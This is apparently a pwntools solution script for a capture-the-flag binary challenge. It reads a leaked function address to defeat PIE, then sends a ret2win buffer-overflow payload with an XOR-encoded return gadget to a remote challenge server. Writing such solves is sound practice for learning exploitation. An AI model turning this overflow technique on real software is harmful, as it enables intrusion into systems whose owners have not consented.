from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('chall.foobar.nitdgplug.org',30021)
    else:
        return process(e.path,level='error')

def repair(addr):
  xor_func = lambda x: x ^ 0x20
  return bytearray(map(xor_func, p64(addr)))

def ret2win():
  p = start()
  win=int(p.recvline(keepends=False),16)
  log.info('Win Leaked: 0x%x' %win)
  e.address=win-e.sym.win
  ret = e.address+0x128e

  chain = chr(127).encode()
  chain += b'A'*71
  chain += repair(ret)
  chain += p64(e.sym['win'])

  log.info('Throwing XOR(Ret)+Win')
  p.sendline(chain)
  p.interactive()

ret2win()
